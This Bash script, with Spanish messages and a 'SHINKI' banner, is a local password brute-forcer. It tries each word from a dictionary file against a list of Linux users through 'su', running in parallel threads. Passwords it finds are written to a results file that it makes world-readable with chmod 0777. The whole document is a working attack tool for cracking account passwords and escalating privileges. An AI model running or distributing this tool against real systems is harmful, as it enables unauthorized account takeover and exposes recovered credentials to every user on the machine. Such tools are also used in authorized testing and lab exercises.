#!/bin/bash

AZUL="\033[1;34m"
VERDE="\033[1;32m"
ROJO="\033[1;31;43m"
RESET="\033[0m"
BLANCO_CLARO="\033[1;97m"

echo -e "${AZUL}"
cat << "EOF"
  _____   _   _   _____   _   _   _  __  _____   
 / ____| | | | | |_   _| | \ | | | |/ / |_   _|  
| (___   | |_| |   | |   |  \| | | ' /    | |    
 \___ \  |  _  |   | |   | . ` | |  <     | |    
 ____) | | | | |  _| |_  | |\  | | . \   _| |_   
|_____/  |_| |_| |_____| |_| \_| |_|\_\ |_____|  
EOF
echo -e "${RESET}"

diccionario="$1"
usuarios="$2"
hilos="$3"
respuesta=1
usuarios_restantes="$usuarios" 

if [ -z "$diccionario" ] || [ -z "$usuarios" ] || [ -z "$hilos" ]; then
    echo -e "${ROJO}Uso: $0 <diccionario> <usuarios> <hilos>${RESET}"
    exit 1
fi

finalizar() {
    echo -e "\e[1;31m\nFinalizando el script\e[0m"
    
    if [ -s usuarios_exitosos.txt ]; then
        rm usuarios_exitosos.txt
    fi

    if [ -s usuarios_restantes.txt ]; then
        rm usuarios_restantes.txt
    fi

    if [ -s archivo.txt ]; then
        rm archivo.txt
    fi

    exit 0 
}

trap finalizar SIGINT

probar_contrasena() {
    local usuario="$1"
    local password="$2"

    local AZUL="\033[1;34m"
    local VERDE="\033[1;32m"
    local ROJO="\033[1;31;43m"
    local RESET="\033[0m"
    local BLANCO_CLARO="\033[1;97m"
    
    echo -e "${BLANCO_CLARO}Probando contraseña = $password para el usuario = $usuario${RESET}"
    if timeout 0.05 bash -c "echo '$password' | su $usuario -c 'echo Hello'" > /dev/null 2>&1; then

        echo -e "${VERDE}La contraseña del usuario $usuario es: $password${RESET}" >> resultado.txt
        chmod 0777 resultado.txt
        echo "$usuario" >> usuarios_exitosos.txt
        echo "0" > archivo.txt
    fi
}

export -f probar_contrasena



while IFS= read -r password; do
    echo -e "${AZUL}Probando contraseña: $password${RESET}"
    
    
    if [ "$respuesta" -eq 0 ]; then

        usuarios_restantes=$(grep -Fxv -f usuarios_exitosos.txt "$usuarios" >> usuarios_restantes.txt ; echo "usuarios_restantes.txt")
        respuesta=1
    fi
    
    
    cat "$usuarios_restantes" | xargs -I {} -P "$hilos" bash -c "probar_contrasena '{}' '$password'"
    
    if [ -s archivo.txt ]; then
        cat resultado.txt
        rm archivo.txt

        read -p "¿Deseas continuar? (s/n): " respuesta </dev/tty
        if [[ "$respuesta" =~ ^[Ss]$ ]]; then
            respuesta=0
        else

            if [ -s usuarios_exitosos.txt ]; then
                rm usuarios_exitosos.txt
            fi

            if [ -s usuarios_restantes.txt ]; then
                rm usuarios_restantes.txt
            fi

            exit 0
        fi
    
    fi
done < "$diccionario"


echo -e "${ROJO}No se encontró ninguna contraseña válida.${RESET}"
